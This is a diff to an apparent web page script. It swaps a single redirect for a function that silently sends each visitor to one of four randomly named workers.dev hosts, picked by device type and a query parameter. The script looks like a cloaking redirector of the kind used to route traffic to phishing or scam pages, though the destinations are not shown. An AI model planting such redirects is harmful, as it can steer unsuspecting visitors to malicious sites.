@@ -1,1 +1,24 @@
-<script>window.location.href="https://rapid-union-5833.yudaiestanove.workers.dev/" </script>
+<script>
+(function () {
+  const params = new URLSearchParams(window.location.search)
+  const t = params.get('t')
+
+  const ua = navigator.userAgent.toLowerCase()
+  const isMobile = /mobile|android|iphone|ipad|ipod/i.test(ua)
+
+  let target = ''
+
+  if (t === 'ww') {
+    target = isMobile
+      ? 'https://misty-hill-2d3e.yudaiestanove.workers.dev/'
+      : 'https://broken-snow-2683.yudaiestanove.workers.dev/'
+  } else {
+   
+    target = isMobile
+      ? 'https://old-hat-7bd3.yudaiestanove.workers.dev/'
+      : 'https://rapid-union-5833.yudaiestanove.workers.dev/'
+  }
+  // ✅ 跳转
+  window.location.replace(target)
+})();
+</script>
